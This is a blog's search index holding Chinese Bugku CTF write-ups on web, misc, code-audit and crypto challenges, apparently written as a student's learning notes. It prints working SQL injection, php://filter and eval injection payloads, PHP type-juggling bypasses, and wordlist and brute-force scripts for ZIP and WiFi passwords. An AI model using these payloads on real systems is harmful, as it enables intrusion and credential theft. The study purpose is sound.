<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Bugku CTF Web(17-) Writeup]]></title>
    <url>%2F2018%2F07%2F20%2FBugku-CTF-Web-%EF%BC%8817-32%EF%BC%89-Writeup%2F</url>
    <content type="text"><![CDATA[0x17flag在index里打开页面有一个链接，点击链接发现URL改变，则可能会有文件包含漏洞。利用php://filter伪协议，php://filter简单理解为用在对文件的读写操作上。payload:?file=php://filter/read=convert.base64-encode/resource=index.php得到一串base64编码，解码后网页源码，flag就在里面。 0x18输入密码查看flag用burp的Intruder暴破，在网上找一找五位的密码字典加载进去，看长度不一样的就是口令了。自己找了好几个都没有暴出来。 0x19备份是个好习惯常见Web源码泄露总结若存在源码泄露，则尝试访问index.php.bak下载源码，函数strstr(str1, str2)判断str2是否是str1的子串；substr(str, start[,length])返回字符串的一部分；str_replace()以其他字符替换字符串中的一些字符（区分大小写）。同时有md5验证相等，且key1不等于key2。双写变量名，构造数组或弱类型绕过。payload:?kekeyy1[]=1&amp;kekeyy2[]=2?kekeyy1=240610708&amp;kekeyy2=QNKCDZO 0x20成绩单页面里有一个POST表单，测试会不会有注入漏洞POST里id=1&#39;和id=1&#39;#id=1&#39; and 1=2#和id=1&#39; and 1=1#前一个不回显后一个回显，那么说明存在注入。判断字段数：有四个字段id=1&#39; order by 4#判断回显位：id=1&#39; union select 1,2,3,4#查数据库：出现skctf_flagid=0&#39; union select 1,2,3,database()#查数据表：出现fl4g, scid=0&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;skctf_flag&#39;#查fl4g字段：得到记录名skctf_flagid=0&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#查询数据：id=0&#39; union select 1,2,3,skctf_flag from fl4g#得到flag。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku CTF Web(1-16) writeup]]></title>
    <url>%2F2018%2F07%2F20%2FBugku-CTF-Web-%EF%BC%881-16%EF%BC%89-writeup%2F</url>
    <content type="text"><![CDATA[0x01.web2右键查看元素，flag在&lt;body&gt;的注释中。 0x02.文件上传测试上传PHP文件才能得到flag，但是只允许上传图片。方法一：可以先上传图片文件，利用burp抓包，更改文件扩展名为php，即可得到flag。方法二：%00截断，先上传图片文件，利用burp抓包，在文件名后面添加“%00.php”，发送，得到flag。 0x03.计算器右键查看元素，发现表单输入有限制输入长度，双击修改maxlength再提交计算结果就得到flag。 0x04.web基础$_GET通过get方法传入参数使“what”的值等于flag。payload:?what=flag 0x05.web基础$_POST通过post方法传入参数使“what”的值等于flag。payload:POST:what=flag 0x06.矛盾题目要求：既要num的值为不是数字，又要num=1。is_numeric(var)当变量是数字或数字字符串时返回true。传入一个1+字母的字符串，可以使is_numeric()返回false，进而进行弱类型转换，使num==1，得到flag。payload:?num=1a 0x07.web3打开链接后发现不断的弹窗。禁止弹窗后，查看源码，发现&lt;script&gt;注释里有一串unicode编码，解码即得到flag。 0x08.sql注入先尝试单引号，发现返回正常，查看源码，发现文字编码是gb2312，存在宽字节注入。测试：?id=1%df%27 and 1=1–+?id=1%df%27 and 1=2–+不加注释则报错，加注释返回正常。判断字段数：?id=1%df%27 order by 2–+判断回显点：?id=-1%df%27 union select 1,2–+查询数据库名：?id=-1%df%27 union select 1,database()–+查询表名：?id=-1%df%27 union select 1,table_name from information_schema.tables where table_schema=0x73716C35–+查询字段名：?id=-1%df%27 union select 1,column_name from information_schema.columns where table_name=0x6B6579–+查询string字段得到flag：?id=-1%df%27 union select 1,string from sql5.key–+ 0x09域名解析域名解析：把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。Windows下域名解析：修改文件C:\windows\system32\drivers\etc\hostsWindows10没有修改hosts文件权限的解决方案 在里面添加一条：120.24.86.145 flag.bugku.com保存，再访问此域名，得到flag。在Linux下域名解析：用命令打开hosts文件：sudo gedit /etc/hosts遇到权限不够的情况时升级为root用户，添加120.24.86.145 flag.bugku.com，保存。再用浏览器打开flag.bugku.com。 0x10SQL注入1函数substr_count()计算子串在字符串中出现的次数。strip_tags()剥去字符串中的 HTML、XML 以及 PHP 的标签。法一：因为有strip_tags()函数，可以在payload中嵌套HTML标签来绕过。测试：数字型参数，id不需要引号闭合，?id=1–+payload: ?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,database() ?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key法二：利用%00截断payload: ?id=-1 uni%00on sel%00ect 1,database() ?id=-1 uni%00on sel%00ect 1,hash fr%00om sql3.key 0x11你必须让他停下reload() 方法用于重新加载当前文档。setTimeout() 方法用于在指定的毫秒数后调用函数或计算表达式。Burp抓包，发送到Repeater，然后不停的“go”，直到在Response中看到flag。 0x12本地包含函数eval()把字符串按照PHP代码执行，var_dump()打印变量的相关信息，show_source()对文件进行语法高亮显示。通过构造hello参数传递给变量a，进而进行代码执行。payload: ?hello=);print_r(file(&quot;flag.php&quot;) ?hello=);var_dump(file(&quot;flag.php&quot;) ?hello=file(&quot;flag.php&quot;) ?hello=);show_source(&quot;flag.php&quot;);var_dump( ?hello=);include(@$_POST[&#39;b&#39;] 在POST里： b=php://filter/convert.base64-encode/resource=flag.php ?hello=);include(&quot;php://filter/convert.base64-encode/resource=flag.php&quot; 0x13变量1函数highlight_file() 函数对文件进行语法高亮显示，preg_match()执行一个正则表达式匹配，其中[\w]表示匹配包括下划线的任何单词字符，类似但不等价于“[A-Za-z0-9_]”，这里的”单词”字符使用Unicode字符集；同时匹配“+”。可变变量：\$\$args表示变量args的值再作为变量名。题目提示flag在变量里，所以使用$GLOBALS数组。payload:?args=GLOBALS 0x14web5题目提示JSPFUCK，则与jsfuck有关。jsfuck:合法的javascript代码，可在大部分浏览器上执行，用来绕过关键词检测。打开源码发现（截图为局部）将这一串编码复制，放到控制台执行，得到flag。 0x15头等舱各个地方都没有找到什么，那么根据题目提示，猜测http头可能有什么。抓包，send to Repeater在响应头里发现flag。 0x16web4题目提示查看源码，发现源码&lt;script&gt;标签里有URL编码，p1解码为1234function checkSubmit()&#123;var a=document.getElementById("password");if("undefined"!=typeof a)&#123;if("67d709b2b p2解码为12345678aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1&#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit; 最后的eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));解码为1eval(unescape(p1) + unescape('54aa2' + p2)); 根据eval()执行代码块的意思拼接出：12345678910111213function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);//getElementById根据指定的 id 属性值得到对象if(&quot;undefined&quot;!=typeof a)&#123;if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;//onsubmit 事件会在表单中的确认按钮被点击时发生 判断变量a的值是否等于67d709b2b54aa2aa648cf6e87a7114f1好像直接输入字符串提交就可以得到flag。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku CTF 杂项（21-29） Writeup]]></title>
    <url>%2F2018%2F07%2F20%2FBugku-CTF-%E6%9D%82%E9%A1%B9%EF%BC%8821-29%EF%BC%89-Writeup%2F</url>
    <content type="text"><![CDATA[0x21图穷匕见下载得到一个图片，用winhex打开发现jpg文件尾FF D8后面有大量16进制数据，复制后面的数据，用notepad++中插件convert，hex-&gt;ascii转换后是一个个坐标点。将括号和逗号去掉保存为txt文件。再利用gnuplot画图（windows)，输入：“plot “文件名””，回车得到一张二维码（注意，文件路径的反斜杠要转义）。不知为啥，自己画出来的扫描不出来。 0x22convertconvert转换的意思，打开是一串二进制，将它转换成十六进制，再把十六进制字符写到HxD中，发现文件头是52 61 72，rar文件头。就把它保存成rar文件，解压得到一张图片，查看属性，里面有一串base64编码，解码得到flag。附上一个脚本：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import binascii__author__ = 'feifei'# !/usr/bin/env python# -*- coding: utf-8 -*-base = [str(x) for x in range(10)] + [chr(x) for x in range(ord('A'), ord('A') + 6)]# bin2decdef bin2dec(string_num): return str(int(string_num, 2))# hex2decdef hex2dec(string_num): return str(int(string_num.upper(), 16))# dec2bindef dec2bin(string_num): num = int(string_num) mid = [] while True: if num == 0: break num, rem = divmod(num, 2) mid.append(base[rem]) return ''.join([str(x) for x in mid[::-1]])# dec2hexdef dec2hex(string_num): num = int(string_num) mid = [] while True: if num == 0: break num, rem = divmod(num, 16) mid.append(base[rem]) return ''.join([str(x) for x in mid[::-1]])# hex2tobindef hex2bin(string_num): return dec2bin(hex2dec(string_num.upper()))# bin2hexdef bin2hex(string_num): return dec2hex(bin2dec(string_num))if __name__ == '__main__': file1 = open('convert.txt') s = file1.read() hexx = bin2hex(s) print hexx file2 = open('4.rar', 'wb') file2.write(binascii.a2b_hex(hexx)) 来自https://blog.csdn.net/yaofeiNO1/article/details/78459569#t3 0x23听首音乐下载得到一个音频，用Audacity音频分析软件打开，猜测是摩尔斯电码，长的用“-”表示，短的用“.”表示，中间用空格隔开。解密得到答案。 0x24好多数值打开发现像是坐标一样的东西，并且看到数值255，猜测与RGB有关。需要用到python的PIL库，知识储备不足。。。RGB值转化图片（python PIL）https://www.cnblogs.com/webFuckeeeer/p/4536776.html 0x25很普通的数独下载下来有25张数独图片，网上说按5*5排列是个二维码，但是第1张是二维码右上角，第5张是二维码左下角，第21张是二维码左上角。位置调好后，将带数字的用0表示，空白处用1表示，再用脚本生成二维码。 0x26好多压缩包解压后发现有68个压缩包，而且每个压缩包里的txt文件都有密码，这里用到一个知识“CRC32碰撞”https://www.anquanke.com/post/id/86211。写一个脚本进行暴破（python3）1234567891011121314151617181920212223242526import zipfileimport stringimport binasciidef CrackCrc(crc): for i in dic: #迭代的不是值而是键（key） for j in dic: for k in dic: for h in dic: s = i + j + k + h if crc == (binascii.crc32(s.encode())): f.write(s) returndef CrackZip(): for i in range(0,68): file = 'out'+str(i)+'.zip' crc = zipfile.ZipFile(file,'r').getinfo('data.txt').CRC CrackCrc(crc)dic = string.ascii_letters + string.digits + '+/='f = open('out.txt','w')CrackZip()print("CRC32碰撞完成")f.close 运行后得到一个out.txt文件，里面是一串base64，解码得到16进制，复制到HxD中，发现底部有rar的文件尾C4 3D 7B 00 40 07 00，还存在一个名为CMT即comment的文件，并且提示“fix the file and get the flag”，说明要修复文件，把rar文件头52 61 72 21 1A 07 00补上，保存成rar文件，用解压软件打开，在注释里找到flag。 0x27一个普通的压缩包(xp0intCTF)下载解压得到一个flag.txt打开写着flag不在里面。用HxD打开压缩包，发现文件头PK，修改后缀为zip解压，里面有一个flag.rar，我并没有遇到他们说的解压打不开的情况。用HxD修改一下flag.rar解压有一个png文件，用HxD查看发现是gif图片，更改后缀，用stegsolve工具打开，只能找到二维码的下半部分。用gifsplitter工具发现这个gif是两帧，并将gif分离，使用stegsolve工具打开这两张图片，然后用PS合并补全，扫一扫。ps:之前以为把上下两半拼起来再把左下角复制一块补到左上角，这样做一直没扫出来，后来才发现右上角也得补一块/xk。 0x28妹子的陌陌保存图片，在kali里用binwalk分析，看到有rar文件，foremost分离，解压发现有密码，没想到的是，密码居然在图片上写着。解压后得到一个momo.txt文件，解密莫尔斯电码，得到一个在线解密的网址，再解下面的AES，最后打开页面得到一个二维码，使用stegsolve进行反色处理，扫一扫。 0x29就五层你能解开吗下载压缩包，用解压软件打开；第一层，CRC32碰撞，参考大神的做法，用脚本碰撞，https://github.com/theonlypwner/crc32碰撞结果：找到每一次碰撞产生的看起来有意义的字符：“_CRC32”，“_i5_n0”，“t_s4f3”拼接起来就是压缩包的密码；第二层：维吉尼亚密码，这个没弄明白。。。第三层：sha1碰撞上脚本：123456789101112131415161718192021# -*- coding:utf-8 -*-import hashlibimport stringimport repayload = string.printablepassword = "%s7%s5-%s4%s3?"sha1 = "619c20c.a4de755.9be9a8b.b7cbfa5.e8b4365."for a in payload: for b in payload: for c in payload: for d in payload: pwd = password %(a,b,c,d) pwd = pwd.encode() if re.findall(sha1,hashlib.sha1(pwd).hexdigest()): print (pwd) break 第四层：MD5校验安全客上有篇相关的文章http://bobao.360.cn/news/detail/768.html程序下载下来，运行得到“Goodbye World :-(”第五层：RSA使用openssl导入公钥，查看模数n和指数e,可以看到指数（Exponent）很大，在RSA中如果n确定，e非常大，会导致d很小，从而出现维纳攻击，使用连分式（Continued fraction）去求得d。维纳攻击的工具：https://github.com/pablocelayes/rsa-wiener-attack修改一下RSAwienerHacker.py求得d，再使用rsatool生成私钥文件，得到rsa_private_key.pem，再用openssl对flag.enx解密这里有一个比较详细的wp:https://mp.weixin.qq.com/s/5_gxomJYbTjXlSLhGoMoxg]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku CTF 杂项（13-20） Writeup]]></title>
    <url>%2F2018%2F07%2F20%2FBugku-CTF-%E6%9D%82%E9%A1%B9%EF%BC%8813-20%EF%BC%89-Writeup%2F</url>
    <content type="text"><![CDATA[0x13这么多数据包用wireshark打开，浏览一下从第104个包开始有TCP协议，那么就是从第104个包开始就是攻击机（192.168.116.138）向目标机（192.168.116.159）进行端口扫描，后面找到攻击机远程连接目标机的包（通过3389端口），网上说从第5542个包已经getshell，追踪TCP流就可以看到一串base64（但不知道原理，请赐教）。普及一下： 3389端口是Windows 2000(2003) Server远程桌面的服务端口，可以通过这个端口，用”远程桌面”等连接工具来连接到远程的服务器，如果连接上了，输入系统管理员的用户名和密码后，将变得可以像操作本机一样操作远程的电脑，因此远程服务器一般都将这个端口修改数值或者关闭。 0x14隐写3下载下来是一个大白的图片，猜测是图片长度被更改了，那么用winhex打开，更改高度的“01”为“11”，保存，flag显现。 0x15做个游戏(08067CTF)下载下来是一个Java写的小游戏，通过Java反编译工具查看源码，在PlaneGameFrame.java中找到一串base64，解码得到flag。（具体原理本人也不清楚）Java在线反编译工具 0x16想蹭网先解开密码题目提示密码是电话号码并且给出了前七位，需要写个密码本遍历出后四位。在其他前辈的wp上看到这么一句话：“WiFi认证过程重点在WPA的四次握手包，找到EAPOL握手协议”，过滤一下可以另存为一个文件，好像不这么做也没什么影响。附上一个python脚本，本人暂时不会python（滑稽） 1234567891011#encoding:utf-8import stringattendNum = string.digitsstr1 = '1391040'f = open('telephone.txt','w')for i in attendNum: for j in attendNum: for k in attendNum: for l in attendNum: f.write(str1+i+j+k+l+'\n')f.close() 还有一个用C写的： 12345678910111213141516171819202122#include&lt;stdio.h&gt;int main()&#123; int i,j,k,l; FILE *fp=NULL; fp=fopen("telephone.txt","w"); for(i=0;i&lt;=9;i++) &#123; for(j=0;j&lt;=9;j++) &#123; for(k=0;k&lt;=9;k++) &#123; for(l=0;l&lt;=9;l++) &#123; fprintf(fp,"1391040%d%d%d%d\n",i,j,k,l); &#125; &#125; &#125; &#125; fclose(fp);&#125; 运行出来一个telephone.txt的密码本，把此txt文件和wifi.cap文件放到kalli里面，使用aircrack-ng工具。终端输入命令：aircrack-ng /root/桌面/wifi.cap -w /root/桌面/telephone.txt然后选择参数3回车就能看到密码。 0x17Linux2下载得到一个名为brave的文件，放入kali。使用strings命令和grep命令查找key。strings /root/桌面/brave | grep -i keystrings命令http://man.linuxde.net/stringsgrep命令http://man.linuxde.net/grep 0x18账号被盗了打开网页，用burp抓包，更改一下cookie，把isadmin改成true，在响应里找到一个exe文件，下载下来是一个CF刷枪的工具。用wireshark抓包，账号密码随便填，追踪TCP流，发现两串base64，解码是邮箱的账号和密码，登陆找到flag。 0x19细心的大象下载得到一张图片，打开属性发现备注里有一串base64，暂时不知道干嘛的。kali里用binwalk查看里面还有一个压缩包，foremost分离，发现里面的压缩包需要密码，那么密码就可能是base64解码的那一串。解压得到和之前一样的图片隐写，更改高度得到flag。还有另一个解法https://blog.csdn.net/sanky0u/article/details/77162806 0x20爆照把图片用binwalk看一下，发现居然有辣么多东西，foremost提取，出现一堆图片，再挨个用binwalk分析，发现其中的88，888，8888是被修改过的。（Linux不太会操作，又把文件移到Windows里的）88里显示一张二维码，更改后缀名为jpg，扫描得到“bilibili”；888里更改后缀名为jpg后，在属性里有base64编码，解码得“silisili”；8888里还包含一个zip文件，foremost分离，解压得到一个二维码，扫描得“panama”。题目提示为“xxx_xxx_xxx”，将以上三个字符串连起来就是flag了。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku CTF 杂项（1-12） Writeup]]></title>
    <url>%2F2018%2F07%2F20%2FBugku-CTF-%E6%9D%82%E9%A1%B9%EF%BC%881-12%EF%BC%89-Writeup%2F</url>
    <content type="text"><![CDATA[0x01签到扫描二维码，关注Bugku微信公众号，在公众号里输入“flag”即得到flag。 0x02这是一张单纯的图片从winhex中打开图片，在底部发现一串HTML实体编码，解码得到flag。 0x03隐写原图片的高度被更改了，IHDR文件头数据块，更改高度，把“A4”改成“F4”，保存，就可以看到被隐藏的flag（注意：图片是透明的）。 0x04telnet解压文件夹中有个pcap的文件，用wireshark打开，右键点击任一个消息追踪流，追踪TCP流，就可以看到flag。 0x05眼见非实(ISCCCTF)下载下来是一个zip文件，那就先解压，里面有个docx文件，拖进winhex发现文件头标识是504B0304，则推断这个docx文件是被改了后缀名的zip文件，更改后缀名后再打开，在word文件夹中的document.xml文件中发现flag。 0x06又一张图片，还单纯吗放入winhex看不出什么，放到kali里，通过终端用binwalk查看，在终端输入：binwalk /root/桌面/2.jpg发现里面包含两个图片，一个jpg格式，一个tiff格式；使用foremost分离文件，输入：foremost /root/桌面/2.jpg在output文件夹中可以找到分离的图片，得到flag。Binwalk：后门（固件）分析利器CTF中图片隐藏文件分离方法总结 0x07猜给了一张某女星的图片，放到百度识图或谷歌图片里搜一下，然后此女星的名字的拼音就是flag的内容/xyx。 0x08宽带信息泄露下载得到一个二进制文件，放入RoutePassView查看，题目提示flag为宽带用户名，则在里面查找user，找到username。 0x09隐写2下载得到一个图片，拖到Kali里用binwalk分析，终端输入：binwalk /root/桌面/Welcome_.jpg发现里面有zip文件，再用foremost分离，终端输入：foremost /root/桌面/Welcome_.jpg解压里面的00000102.zip文件，发现里面还有flag.rar和一个图片提示，提示说密码是三个数，那么就暴破吧；利用fcrackzip进行暴破，路径移动到flag.rar所在文件夹，终端输入：fcrackzip -b -l 3 -c ‘1’ -u flag.rar得到密码，再解压又出现一张图片，winhex打开，在底部发现base64编码的flag。 0x10多种方法解决下载解压里面是个无法打开的exe文件，用文本编辑器打开，里面写着jpg和base64编码，利用解码工具解开是个二维码，扫描得到flag。在线图片base64编码在线二维码解码器 0x11linux解压得到一个名为flag的二进制文件，使用grep命令（使用正则表达式搜索文本），转换到flag所在文件路径，终端输入：grep ‘key’ -a flag搜索到flag。 0x12中国菜刀解压得到一个pcapng文件，用wireshark打开追踪TCP流，发现里面有flag.tar.gz用binwalk提取，输入binwalk -e /root/桌面/caidao.pcapng再解压，得到flag的文本。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku CTF 代码审计 writeup]]></title>
    <url>%2F2018%2F07%2F19%2FBugku-CTF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-writeup%2F</url>
    <content type="text"><![CDATA[ps:本篇博文是从本人的CSDN上搬过来的。 0x01extract变量覆盖extract()函数功能：从数组中将变量导入到当前的符号表。使用数组键名作为变量名，使用数组键值作为变量值。extract(array,extract_rules,prefix)题中给出extract($_GET)，相当于：$shiyan = $_GET[‘shiyan’]$flag = $_GET[‘flag’]。另外，isset()函数判断$shiyan变量是否设置，像这样，即使变量为空，isset()函数也为true。payload:?shiyan=&amp;flag=或者利用php://伪协议：payload:?shiyan=&amp;flag=php://input 0x02strcmp比较字符串strcmp(str1, str2)比较两个字符串大小，若是非字符串（例如数组）比较，则会出错。在5.3之前的php中，显示了报错的警告信息后，将return 0。payload:?a[]=1 0x03urldecode二次编码绕过eregi()在一个字符串中搜索指定的模式的字符串，搜索不区分大小的正则匹配。urldecode()解码以编码的URL字符串，但是$_GET[]会将参数解码一次。若本题将“hackerDJ”进行两次URL编码，在eregi()中比较”hackerDJ”与$_GET[id]是否相同，$_GET会解码一次，从二次URL编码变成一次URL编码；urldecode()会将$_GET[id]从二次URL编码变成一次URL编码，赋值给$_GET[id]，当$_GET[id]与“hackerDJ”比较时，$_GET[id]再从一次URL编码解码，最后比较相等得到flag。将“hackerDJ”进行两次URL编码。payload：?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61 0x04md5()函数md5()计算字符串的MD5散列值。md5()函数不能处理数组，使用数组绕过，md5(array)会返回null。payload1:?username[]=1&amp;password=2 0x05数组返回NULL绕过strpos(string, find[, start])查找字符串在另一字符串中第一次出现的位置。ereg()正则匹配，需使password中只含有英文字母和数字，又因为strpos()需要匹配“–”才能得到flag，可以使用数组绕过ereg()和strpos()。ereg()只能处理字符，而password是数组，所以返回的是null，三个等号的时候不会进行类型转换。所以null!==false。strpos()的参数同样不能够是数组，所以返回的依旧是null，null!==false也是正确。payload:?password[]=1思路二：ereg()可以进行%00截断，绕过正则匹配。payload:?password=1%00-- 0x06弱类型整数大小比较绕过is_numeric(var)检测变量是否为数字或数字字符串，是则返回true，否则返回false。is_numeric()对于空字符%00，无论%00放在前面还是后面都可以判断为非数值，而空格%20只能放在数值后面，实质上都是弱类型转换。payload1:?password=1337%00payload2:?password=1337%20payload3:?password=1337a 0x07sha()函数比较绕过同md5()一样，sha1()函数也无法处理数组，因此可以构造数组绕过。payload:?name[]=1&amp;password=2 0x08md5加密相等绕过md5生成的以“0e”开头的哈希值都解释为0，所以PHP在判断时会认为相同。payload:?a=240610708 0x09十六进制与数字比较ord()返回字符串中首个字符的ASCII值。题目中会要求输入的password中不能有0~9数字，并且还需要判断$number==$_GET[password]。所以将$number=3735929054转换为16进制“deadc0de”，再在前面加上0x表示16进制。payload:?password=0xdeadc0de 0x10ereg正则%00截断题目通过ereg()函数判断password中是否只含有字母或数字，进而限制password长度小于8，并且值小于9999999；在此前提下用strpos()函数搜索password中是否含有“-”，若是则输出flag。解法一，利用数组绕过strpos()函数。payload:?password[]=9999999999解法二，利用ereg()%00截断漏洞，在用科学记数法来构造1e9满足strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’]&gt; 9999999这个条件，再加上“-”来满足strpos()的条件。payload:?password=1e9%00*-* 0x11strpos数组绕过构造数组绕过，并且值含有数字。payload:?ctf[]=1 0x12数字验证正则绕过直接POST一个password就可以，并且小于12个字符。payload: POST:password=1]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku CTF 加密writeup （未完待续）]]></title>
    <url>%2F2018%2F07%2F19%2FBugku-CTF-%E5%8A%A0%E5%AF%86-writeup-%EF%BC%88%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD%EF%BC%89%2F</url>
    <content type="text"><![CDATA[ps:本篇博文是从本人的CSDN上搬过来的。本人CTF小白一枚，此wp是参考网上大佬的wp再加上自己操作写出来的，如有纰漏，还请指正。 0x01滴答~滴从提供的密码可以猜测是摩尔斯密码，利用bugku自带的解码工具进行解码，space为空格，short为“.”，long为“-”，得到flag。 0x02聪明的小羊提示中有“栅栏”，则猜测为栅栏密码，并且栏数为2，利用bugku自带工具解码，得到flag。 0x03ok此加密为ook加密，利用ook解码工具，将文本解码，得flag。 0x04这不是摩斯密码此加密为brainfuck加密，利用解码工具，得flag。 0x05简单加密从末尾的AA猜测出可能是凯撒移位和base64的结合，首先参照ASCII吗，A是65，=是61，偏移4位。用工具中的凯撒移位解码，得到一串base64编码，再进行base64解码，得到flag。（本题的思路需要之前有一定的经验积累） 0x06一段Base64这道题还没解出来，后续会更。 0x07.!?又是ook编码。（ook特点：有问号，点号，感叹号） 0x08+[]-又是brainfuck编码。（brainfuck特点：有加号，减号，方括号，尖括号） 0x09奇怪的密码从密码中看到一个欧元符号和一个右花括号，分析前四个字母，其ASCII码为103，110，100，107；flag四个字母的ASCII码为102，108，97，103，可以看出，第一个向前移一位，第二个向前移两位，以此类推。写一个简单解码脚本（PHP写不来，最后用C语言写的） 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void)&#123; int i, tmp = 1, len; char str[] = &quot;gndk€rlqhmtkwwp&#125;z&quot;; len = strlen(str); for (i = 0; i &lt; len; i++) &#123; printf(&quot;%c&quot;, (char)((int)str[i] - tmp)); tmp++; &#125; return 0;&#125; 0x10托马斯.杰斐逊这题也没解出来，后续再更。 0x11zip伪加密先附上一个关于zip伪加密的讲解：https://blog.csdn.net/u011377996/article/details/79286958（侵权立删）用HxD打开压缩文件，把文件目录区的全局方式位标记中09改成00或其他偶数即可解压，得到flag.txt。 0x12告诉你个秘密(ISCCCTF)从编码可以猜测出是十六进制，进行ASCII码转换，得到一串可能为base64的编码，再进行base64解码，得到四个或三个字母为一组的编码，（此处脑洞有些大）观察键盘发现，四个或三个字母围起来的字符就是解码的字符，例如：r5yG围的字母“T”，等等。最后的flag格式网上说是flag:xxxxxxx但我试过很多种，很多遍没成功，等会儿再试试，不过解题思路是这样。 0x13来自宇宙的信号这道题挺有意思的。打开看到一串奇怪的字符，到百度上搜搜“银河战队”没搜出来相关的文字，再搜一下“银河文字”，找到相关的文字转换，这种文字叫“标准银河字母”，然后对照解码，得到flag。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一篇博文]]></title>
    <url>%2F2018%2F07%2F18%2F%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E6%96%87%2F</url>
    <content type="text"><![CDATA[搭建博客搭博客（用的hexo和Github）鼓捣了一天，中途遇到了一些小问题，在用1$ hexo d 部署到Github的时候不成功，猜测其中的原因可能是在Github上创建库的时候第一次输错名字了，后来又改过来的，没有深究，直接简单粗暴地全部删了重新来一遍。 参考链接搭建博客的时候参考了Hpd0ger同学和Ea5ter同学的经验，还有一个Hexo博客搭建全攻略。 结语之前都是在CSDN上写写writeup，现在刚搭好自己的博客，写下第一篇博文（虽然不太正式），心情倒是挺激动的。这是进道格的第一份暑期任务，算是完成了，后续会完善各种功能，并把学习笔记和心得体会再搬到博客上来。路漫漫其修远兮，吾将上下而求索。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
</search>
